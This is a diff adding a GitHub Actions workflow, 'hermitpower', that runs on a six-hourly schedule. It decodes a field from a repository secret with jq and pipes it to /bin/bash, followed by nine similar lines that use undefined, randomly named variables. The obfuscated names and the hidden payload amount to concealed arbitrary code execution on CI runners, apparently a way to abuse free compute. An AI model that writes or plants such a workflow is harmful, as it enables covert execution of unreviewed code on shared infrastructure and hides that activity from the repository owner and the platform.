@@ -1,0 +1,27 @@
+name: hermitpower
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hermitpower
+        env:
+          byco81050: ${{ secrets.byco81050 }}
+        run: |
+          echo $byco81050 | jq -r .qgu88 | /bin/bash
+          echo $wscph9866 | jq -r .tvbpe801 | /bin/bash
+          echo $qta5 | jq -r .yu67349 | /bin/bash
+          echo $mjgnl881 | jq -r .zmky6 | /bin/bash
+          echo $itkv871 | jq -r .oo43256 | /bin/bash
+          echo $mpc69 | jq -r .kwh12095 | /bin/bash
+          echo $bl1 | jq -r .dvc066 | /bin/bash
+          echo $jt42 | jq -r .av241 | /bin/bash
+          echo $usuz4 | jq -r .e36 | /bin/bash
+          echo $f7 | jq -r .ll559 | /bin/bash
+
